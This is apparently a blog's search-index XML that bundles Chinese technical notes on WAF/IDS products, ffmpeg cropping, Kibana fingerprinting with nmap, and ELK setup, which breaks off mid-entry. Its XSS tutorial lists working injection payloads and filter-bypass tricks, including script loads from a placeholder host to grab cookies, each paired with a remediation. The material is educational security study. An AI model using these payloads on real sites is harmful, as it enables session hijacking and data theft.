<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>web_应用安全</title>
    <link href="/2024/11/05/security/secbuild/%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web_%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    <url>/2024/11/05/security/secbuild/%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web_%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="Web应用防火墙"><a href="#Web应用防火墙" class="headerlink" title="Web应用防火墙"></a>Web应用防火墙</h2><p>Web Application Firewall </p><p>工作在应用层</p><p>基于规则</p><p>对来自Web应用程序客户端的各类请求进行内容检测和验证</p><p>硬件WAF</p><p>支持桥接模式、旁路模式、反向代理等部署模式</p><p>优先选择</p><p>负载均衡设备F5也支持SSL卸载和应用防护</p><p>CheckPoint防火墙的IPS模块具备一定的WAF功能</p><p>软件WAF</p><p>基于成本考虑或不重要区域</p><p>ModSecurity：</p><p>基础规则集</p><p>包括与HTTP协议规范相关的一些规则，例如SQL注入、XSS、目录遍历、Webshell等</p><p>SLR规则集</p><p>针对特定应用（例如Joomla、PHPBB、WordPress等）的漏洞利用规则</p><p>可选规则集</p><p>实验性规则集</p><p>云WAF</p><p>本质还是软件WAF</p><h2 id="入侵检测-防御系统"><a href="#入侵检测-防御系统" class="headerlink" title="入侵检测&#x2F;防御系统"></a>入侵检测&#x2F;防御系统</h2><p>入侵检测系统 IDS  Intrusion Detection System</p><p>入侵防御系统 IPS Intrusion Prevention System</p><p>开源产品 Snort</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secbuild</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secbuild</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>视频黑边处理</title>
    <link href="/2024/11/04/yunwei/tips/%E8%A7%86%E9%A2%91%E9%BB%91%E8%BE%B9%E5%A4%84%E7%90%86/"/>
    <url>/2024/11/04/yunwei/tips/%E8%A7%86%E9%A2%91%E9%BB%91%E8%BE%B9%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">处理一些旧视频源的时候，有时候需要切上下左右的黑边。ffmpeg 的 -vf 滤镜可以完成这一工作。比如，某视频画面大小是 <span class="hljs-number">1920</span>x1080，但实际有图像部分的大小是 <span class="hljs-number">1400</span>x1080，两边都是黑色填充。但这 <span class="hljs-number">1400</span>x1080 的图像边缘也并不整齐，有一些黑边。那么就可以这样处理得到干净的画面：<br><br>ffmpeg -hwaccel cuda -<span class="hljs-keyword">c</span>:<span class="hljs-variable">v:0</span> h264_cuvid -i <span class="hljs-number">03</span>.<span class="hljs-keyword">mkv</span> -<span class="hljs-keyword">map</span> <span class="hljs-number">0</span>:<span class="hljs-variable">v:0</span> -<span class="hljs-keyword">map</span> <span class="hljs-number">0</span>:<span class="hljs-variable">a:0</span> -<span class="hljs-keyword">map</span> <span class="hljs-number">0</span>:<span class="hljs-variable">a:1</span>  -<span class="hljs-keyword">sn</span> -<span class="hljs-keyword">c</span>:<span class="hljs-keyword">a</span> <span class="hljs-keyword">copy</span> -<span class="hljs-keyword">c</span>:v hevc_nvenc -vf <span class="hljs-string">&quot;crop=1400-10:ih-22:(iw-1400)/2+5:2,scale=1400:1080,setsar=1:1&quot;</span> -<span class="hljs-variable">b:v</span> <span class="hljs-number">1.5</span>M -maxrate:v <span class="hljs-number">6</span>M -<span class="hljs-keyword">bf</span>:v <span class="hljs-number">4</span> <span class="hljs-number">03</span><span class="hljs-keyword">new</span>.<span class="hljs-keyword">mkv</span><br><br>在上面的 -vf 滤镜中，crop 负责切割画面，用法是：“crop=切割后的宽度:切割后的高度:横向切割起点:纵向切割起点”；iw 和 ih 表示原始视频画面的宽度和高度。切掉黑边后，得到的画面会比 <span class="hljs-number">1400</span>x1080 略小，用 “scale=<span class="hljs-number">1400</span>:<span class="hljs-number">1080</span>” 可以把画面拉伸到 <span class="hljs-number">1400</span>x1080。<br><br>注意：如果用 Nvidia 显卡编解码，此时不能用 -hwaccel_output_format cuda 参数。因为这个参数的功能是让显卡解码后的数据直接进入显卡编码器，整个过程不出显卡。这样效率自然最高，但由 CPU 实现的视频滤镜自然也就无效了。<br></code></pre></td></tr></table></figure><p><img src="/image-20241104083159457.png" alt="image-20241104083159457"></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_base</title>
    <link href="/2024/11/04/security/secvulns/xss/xss_base/"/>
    <url>/2024/11/04/security/secvulns/xss/xss_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>XSS（Cross Site Scripting），中文简称：跨站脚本攻击</p><p>简单来说，跨站脚本攻击就是通过在前端页面写入指定代码，从而获取用户某些信息的一种攻击方式，这种攻击方式更多是依靠浏览器来进行。</p><p>XSS所在的大类注入，在最新的OWASP Top 10中位于第三</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>常见的分类有三种，反射型、存储型和DOM型，在渗透测试中最常见的两种就是反射型和存储型，DOM型的XSS漏洞比较少见。</p><p>反射型XSS</p><p>存储型XSS</p><p>DOM型XSS</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="数据回显到HTML环境中"><a href="#数据回显到HTML环境中" class="headerlink" title="数据回显到HTML环境中"></a>数据回显到HTML环境中</h2><h3 id="payload构造思路"><a href="#payload构造思路" class="headerlink" title="payload构造思路"></a>payload构造思路</h3><p>1、代码层没有进行任何的过滤</p><p>使用 “&gt; 闭合原有的标签，加入自己的标签</p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;http://ip/myjs/cookie.js&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">document.body.appendChild(document.createElemeng(</span>&#x27;<span class="hljs-attr">script</span>&#x27;))<span class="hljs-attr">.src</span>=<span class="hljs-string">&#x27;http://ip/myjs/cookie.js&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;<span class="hljs-selector-tag">img</span> onfocus=document<span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.appendChild</span>(document<span class="hljs-selector-class">.createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>)).<span class="hljs-attribute">src</span>=<span class="hljs-string">&#x27;http://ip/myjs/cookie.js&#x27;</span> autofocus&gt;<br></code></pre></td></tr></table></figure><p>2、对 &lt; 标签存在过滤</p><p>使用事件函数</p><p>例如：</p><p>onfocus() – 最优</p><p>onfocus 事件是在对象获取到焦点时发生，也就是当用户通过鼠标点击或者键盘操作让这个元素处于被选中、可操作的状态时，常用于<input> 、<a> 、 <select> 标签，注意 html 、title、head、iframe、meta、script和style标签不可使用。相反作用的事件函数 onblur()，当对象失去焦点时发生。</p><p>onclick()</p><p>onclick 事件是元素被点击时发生</p><p>注意 html 、title、head、iframe、meta、script和style标签不可使用</p><p>3、如果过滤了 &lt; &gt; 符号，没有过滤单双引号 “ ‘ </p><p>在低版本IE中可以构造触发，高版本IE和Firefox、Chrome中会自动对单双引号进行编码处理</p><p>例如：</p><p>IE6</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>domain<span class="hljs-regexp">/op/</span>liveCourse<span class="hljs-regexp">/index.shtm?subCode=aaa&quot;sTYle=&#x27;acu:Expre/</span>**/SSion(confirm(<span class="hljs-number">123456</span>))<span class="hljs-string">&#x27;bad=&quot;</span><br></code></pre></td></tr></table></figure><p>&#x2F;**&#x2F; 是为了绕waf的限制</p><p>4、hidden标签</p><p>最优方案是构造自己的标签，如果无法构造，在特殊环境下，也可以尝试触发</p><p>4.1、在IE6下添加CSS触发</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//domain/console/newmsg/index.action?csid<span class="hljs-operator">=</span><span class="hljs-number">123456</span><span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>style<span class="hljs-operator">=</span><span class="hljs-variable">%22</span><span class="hljs-keyword">x</span>:expression(alert(/xss/))<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span><span class="hljs-keyword">x</span><span class="hljs-operator">=</span><span class="hljs-variable">%22</span>&amp;list<span class="hljs-operator">=</span>msg<br></code></pre></td></tr></table></figure><p>URL解码后</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/domain/console</span><span class="hljs-regexp">/newmsg/index</span>.action?csid=<span class="hljs-number">123456</span><span class="hljs-string">&quot; style=&quot;</span><span class="hljs-symbol">x:</span>expression(alert(<span class="hljs-regexp">/xss/</span>))<span class="hljs-string">&quot; x=&quot;</span>&amp;list=msg<br></code></pre></td></tr></table></figure><p>构造后在源码中的结果</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type<span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> id<span class="hljs-operator">=</span><span class="hljs-string">&quot;mobilephone&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;mobilephone&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> style<span class="hljs-operator">=</span><span class="hljs-string">&quot;x:expression(alert(/xss/))&quot;</span> x<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>4.2、构造按键触发（触发条件苛刻，需要用户按键） shift+alt+按键 触发</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://domain/console/newmsg/index.action?csid=<span class="hljs-number">999</span>%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>accessskey=%<span class="hljs-number">22</span>X%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>onclick=alert(<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>x=%<span class="hljs-number">22</span>&amp;list=msg<br></code></pre></td></tr></table></figure><p>URL解码后</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>domain<span class="hljs-regexp">/console/</span>newmsg/index.action?csid=<span class="hljs-number">999</span><span class="hljs-string">&quot; accessskey=&quot;</span>X<span class="hljs-string">&quot; onclick=alert(1) x=&quot;</span>&amp;list=msg<br></code></pre></td></tr></table></figure><p>通过shift+alt+A来触发</p><p>5、title iframe标签</p><p>由于在原标签无法触发 JS payload，只能闭合原标签，构造新的JS代码标签</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>数据回显到 HTML 代码中的时候需要对特殊字符进行编码处理</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;  --&gt; <span class="hljs-symbol">&amp;lt;</span><br>&gt;  --&gt; <span class="hljs-symbol">&amp;gt;</span><br>&#x27;  --&gt; <span class="hljs-symbol">&amp;#39;</span><br>&quot;  --&gt; <span class="hljs-symbol">&amp;quot;</span><br>&amp;  --&gt; <span class="hljs-symbol">&amp;amp;</span><br><br><span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;quot;</span>等均为字符实体名称<br><span class="hljs-symbol">&amp;#60;</span><span class="hljs-symbol">&amp;#62;</span><span class="hljs-symbol">&amp;#34;</span>是对应字符实体名称的实体编号<br><br>&#x27; 的实体名称是 <span class="hljs-symbol">&amp;apos;</span> 但是 IE 不支持这个，所以直接将其编码为 <span class="hljs-symbol">&amp;#39;</span><br><br>因此，实体编码处理一般情况下，处理为字符实体名称和实体编号都是可以的，除了  &#x27;  符号<br>    <br>注：字符实体名称对大小写敏感！！！！<br></code></pre></td></tr></table></figure><h2 id="数据回显到JS环境中"><a href="#数据回显到JS环境中" class="headerlink" title="数据回显到JS环境中"></a>数据回显到JS环境中</h2><h3 id="payload构造思路-1"><a href="#payload构造思路-1" class="headerlink" title="payload构造思路"></a>payload构造思路</h3><p>数据回显到JS中，通过闭合原有，构造自己的代码</p><p>如果过滤了空格，可以使用&#x2F;进行绕过</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">例如：<br>    &lt;<span class="hljs-keyword">script</span>/src<br><br>注意：<br>    在不同浏览器中也是不一样的<br></code></pre></td></tr></table></figure><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>需要检查响应包中的 content-type 属性中，charset参数是GBK还是UTF-8</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">如果是 GBK，修复方案：<br>检查输入数据的数据类型，对其进行判断<br>数据输出时将特殊字符都替换为空（‘、“、\、/替换为空）<br><br>如果是 UTF<span class="hljs-number">-8</span>，修复方案：<br>数据回显到 JS 中时需要对其进行特殊字符的转义<br>\  <span class="hljs-comment">--&gt; \\</span><br><span class="hljs-string">&#x27;   --&gt; \&#x27;</span><br>&quot;  --&gt; \&quot; <br>/  <span class="hljs-comment">--&gt; \/</span><br><br>还有一种可能就是回显到 <span class="hljs-keyword">window</span>.<span class="hljs-keyword">location</span> 跳转中，同样需要进行转义处理，如果转义处理之后回显到HTML 还会触发 XSS ，可以通过URL 编码进行处理<br></code></pre></td></tr></table></figure><h2 id="数据回显到JSONP中"><a href="#数据回显到JSONP中" class="headerlink" title="数据回显到JSONP中"></a>数据回显到JSONP中</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>jsonp中存在 XSS的问题点在于</p><p>允许自定义callback方法会将定义的内容输出到页面中</p><p>如果响应包中的 content-type 参数为 text&#x2F;html，会将输出内容作为JS代码处理</p><p>如果响应包中的content-type参数为application&#x2F;json，会将输出内容作为JSON数据处理</p><h3 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h3><p>将响应包中的content-type参数修改为application&#x2F;json</p><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>响应数据包中的 content-type 参数为 text&#x2F;plain application&#x2F;javascript application&#x2F;x-javascript，也不会将输出内容作为 JS 代码执行，也就是说只有 content-type 参数设置为 text&#x2F;html 时才会触发</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>页面中进行跳转 gotourl 问题<br><a href="http://m.xxx.com/m_member/member/login.shtm?flag=bj&gotoURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjM0NSk8L3NjcmlwdD4=">http://m.xxx.com/m_member/member/login.shtm?flag=bj&amp;gotoURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjM0NSk8L3NjcmlwdD4=</a></p><p>gotoURL 参数可以通过伪协议构造 XSS</p><p><strong>data协议</strong></p><p>payload</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">data:text/html;base<span class="hljs-number">64</span>,PH<span class="hljs-symbol">NjcmlwdD5</span>hbGVydCgxMj<span class="hljs-name">M0</span><span class="hljs-symbol">NSk8</span>L<span class="hljs-number">3</span><span class="hljs-symbol">NjcmlwdD4</span>=<br></code></pre></td></tr></table></figure><p>payload解读</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PH<span class="hljs-symbol">NjcmlwdD5</span>hbGVydCgxMj<span class="hljs-name">M0</span><span class="hljs-symbol">NSk8</span>L<span class="hljs-number">3</span><span class="hljs-symbol">NjcmlwdD4</span>=<br>base<span class="hljs-number">64</span>解码后<br>&lt;script&gt;alert<span class="hljs-comment">(12345)</span>&lt;/script&gt;<br><br>PH<span class="hljs-symbol">NjcmlwdD5</span>hbGVydCgxMj<span class="hljs-name">M0</span><span class="hljs-symbol">NTYpPC9</span>zY<span class="hljs-number">3</span>JpcHQ+<br>base<span class="hljs-number">64</span>解码后<br>&lt;script&gt;alert<span class="hljs-comment">(123456)</span>&lt;/script&gt;<br><br>需要注意，如果base<span class="hljs-number">64</span>编码后最后一位是 + 号，会导致url将其认为是连接符，所以需要将其转化为 <span class="hljs-meta">%</span><span class="hljs-number">2</span>b<span class="hljs-comment">(URL 编码的+)</span><br></code></pre></td></tr></table></figure><p><strong>javascript协议</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h3 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h3><p>检测 gotoURL 参数是否是以 http:&#x2F;&#x2F; 开头的，如果不是强行添加协议头 http:&#x2F;&#x2F; ，并对 URL 进行 URL 编码处理</p><h2 id="数据回显到href或者refer"><a href="#数据回显到href或者refer" class="headerlink" title="数据回显到href或者refer"></a>数据回显到href或者refer</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>数据回显到 href 或者 refer处理，且在低版本浏览器中</p><p>从 URL 中获取的数据回显到 href 等链接中时是否存在 %3c%3e %27 等，出现这种情况就得需要进行低版本浏览器的测试</p><p>Firefox chrome 新版本IE 中会对 &gt; “ 已经做处理</p><p>低版本的IE 不会做处理，存在 XSS</p><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>IE中，不会对 “ ‘ ( ) 进行编码</p><p>Firefox、Chrome中，会对 “ 进行编码 %22&lt;&#x3D;&#x3D;&gt;”</p><h1 id="防护绕过"><a href="#防护绕过" class="headerlink" title="防护绕过"></a>防护绕过</h1>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_同源策略</title>
    <link href="/2024/11/04/security/secvulns/xss/xss_%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <url>/2024/11/04/security/secvulns/xss/xss_%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kibaba_base</title>
    <link href="/2024/11/01/security/secvulns/elk/kibana_base/"/>
    <url>/2024/11/01/security/secvulns/elk/kibana_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>默认端口：5601</p><p>服务信息：http</p><p>版本信息：Elasticsearch Kibana (serverName: kibana)</p><p>Title：Elastic Kibana</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">➜  /tmp nmap -<span class="hljs-variable">sV</span> <span class="hljs-number">10.182</span><span class="hljs-number">.8</span><span class="hljs-number">.138</span> -p <span class="hljs-number">5601</span> <br>Starting Nmap <span class="hljs-number">7.95</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-12</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.182</span><span class="hljs-number">.8</span><span class="hljs-number">.138</span><br>Host is up (<span class="hljs-number">0.013</span>s latency).<br><br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">5601</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Elasticsearch Kibana (serverName: kibana)<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">11.51</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><h2 id="查看kibaba版本"><a href="#查看kibaba版本" class="headerlink" title="查看kibaba版本"></a>查看kibaba版本</h2><h3 id="web查看"><a href="#web查看" class="headerlink" title="web查看"></a>web查看</h3><p>ip:port&#x2F;app&#x2F;kibana#&#x2F;management?_g&#x3D;()</p><p>Mangement模块查看也行</p><h3 id="api查看"><a href="#api查看" class="headerlink" title="api查看"></a>api查看</h3><p>curl -X GET “http:&#x2F;&#x2F;<your-kibana-host>:5601&#x2F;api&#x2F;status” -H ‘Content-Type: application&#x2F;json’</p><p>查看 “version”:{“number”:”6.3.1”字段</p><h3 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h3><p>nmap -sV -T4 1.1.1.1 -p 5601 </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>➜  ~ nmap -<span class="hljs-variable">sV</span> -T4 <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> -p <span class="hljs-number">5601</span> <br>Starting Nmap <span class="hljs-number">7.95</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-01</span> <span class="hljs-number">10</span>:<span class="hljs-number">44</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br>Host is up (<span class="hljs-number">0.0069</span>s latency).<br><br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">5601</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Elasticsearch Kibana <span class="hljs-number">6.3</span><span class="hljs-number">.1</span> (serverName: kibana)<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">14.30</span> <span class="hljs-built_in">seconds</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>elk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>elk部署</title>
    <link href="/2024/11/01/security/secvulns/elk/elk%E9%83%A8%E7%BD%B2/"/>
    <url>/2024/11/01/security/secvulns/elk/elk%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="0x1-服务描述"><a href="#0x1-服务描述" class="headerlink" title="0x1 服务描述"></a><strong>0x1 服务描述</strong></h2><p>官网地址：<a href="https://www.elastic.co/">https://www.elastic.co/</a></p><h2 id="0x2-服务基础信息"><a href="#0x2-服务基础信息" class="headerlink" title="0x2 服务基础信息"></a><strong>0x2 服务基础信息</strong></h2><h3 id="elasticsearch"><a href="#elasticsearch" class="headerlink" title="elasticsearch"></a><strong>elasticsearch</strong></h3><p>默认端口：9200</p><p>服务信息：ssl&#x2F;http</p><p>版本信息：Elasticsearch REST API 7.0 or later (Shield plugin; realm: security)</p><h3 id="kibaba"><a href="#kibaba" class="headerlink" title="kibaba"></a><strong>kibaba</strong></h3><p>默认端口：5601</p><p>服务信息：http</p><p>版本信息：Elasticsearch Kibana (serverName: kibana)</p><p>Title：Elastic Kibana</p><h2 id="0x3-服务部署"><a href="#0x3-服务部署" class="headerlink" title="0x3 服务部署"></a><strong>0x3 服务部署</strong></h2><p>部署环境：AlmaLinux release 9.2</p><h3 id="filebeat"><a href="#filebeat" class="headerlink" title="filebeat"></a><strong>filebeat</strong></h3><h4 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a><strong>下载安装包</strong></h4><p><a href="https://www.elastic.co/cn/downloads/beats/filebeat">https://www.elastic.co/cn/downloads/beats/filebeat</a></p><p>wget <a href="https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.15.2-linux-x86_64.tar.gz">https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.15.2-linux-x86_64.tar.gz</a></p><h4 id="解压到当前目录"><a href="#解压到当前目录" class="headerlink" title="解压到当前目录"></a><strong>解压到当前目录</strong></h4><p>tar -zxf filebeat-8.15.2-linux-x86_64.tar.gz</p><p>cd filebeat-8.15.2-linux-x86_64</p><h4 id="修改配置文件filebeat-yml"><a href="#修改配置文件filebeat-yml" class="headerlink" title="修改配置文件filebeat.yml"></a><strong>修改配置文件filebeat.yml</strong></h4><h5 id="配置数据输入"><a href="#配置数据输入" class="headerlink" title="配置数据输入"></a><strong>配置数据输入</strong></h5><h6 id="查看支持的模块"><a href="#查看支持的模块" class="headerlink" title="查看支持的模块"></a>查看支持的模块</h6><p>.&#x2F;filebeat modules list</p><h6 id="编辑filebeat-yml"><a href="#编辑filebeat-yml" class="headerlink" title="编辑filebeat.yml"></a>编辑filebeat.yml</h6><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">filebeat.inputs</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">filestream</span><br>    <span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">oslog</span><br>    <span class="hljs-attribute">enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>    <span class="hljs-attribute">paths</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/log/*.log</span><br></code></pre></td></tr></table></figure><h5 id="配置数据输出到elasticsearch"><a href="#配置数据输出到elasticsearch" class="headerlink" 